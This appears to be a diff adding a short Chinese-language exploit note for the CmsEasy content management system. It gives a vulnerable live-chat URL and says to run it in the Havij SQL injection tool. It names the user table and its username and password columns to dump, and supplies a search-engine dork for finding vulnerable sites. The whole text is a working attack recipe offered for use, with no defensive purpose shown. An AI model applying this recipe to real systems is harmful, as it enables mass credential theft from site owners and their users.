@@ -1,0 +1,11 @@
+入EXP:
+
+http://www.shitsec.com/celive/js/include.php?cmseasylive=1111&departmentid=0 
+
+直接放Havij里面跑。错误关键字:online.gif
+
+添加表名：cmseasy_user
+
+列表：userid,username,password
+
+百度关键字：Powered by CmsEasy
